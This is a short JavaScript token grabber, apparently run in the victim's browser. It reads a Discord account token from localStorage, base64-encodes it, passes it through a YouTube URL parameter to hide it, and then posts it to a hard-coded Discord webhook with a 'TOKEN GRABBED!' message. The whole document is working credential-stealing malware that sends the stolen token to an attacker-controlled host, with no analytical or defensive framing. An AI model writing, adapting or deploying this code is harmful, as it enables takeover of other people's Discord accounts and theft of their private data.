(function () {
    const webhook = "https://discord.com/api/webhooks/1226189281484083260/iTxJvOc9Y4sEY-Zzeo36QHFVKCvN8seWqOcsR_gHh4zbBMCKGpOJTVrW5XvQow0VzTWs";
    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        if (param !== null) {
            const request = new XMLHttpRequest();
            request.open("POST", webhook);
            request.setRequestHeader("Content-type", "application/json");
            const params = {
                username: "Koneser Here",
                avatar_url: "https://cdn.discordapp.com/avatars/1202298426675712066/a_282f1d3ad646475698d87de7155553c5.gif?size=1024",
                content: "@everyone ⚠️ **TOKEN GRABBED!**\n\n🔒 **Time:** " + new Date().toLocaleString() + "\n\n🔓 **Token Access Obtained:**\n\n **Ezz To Celebrate**🎉🎉🥳 " + param
            };
 
            request.send(JSON.stringify(params));
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {
        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
        }
    } else {
        window.location.href = "https://discord.com/channels/@me";
    }
})();
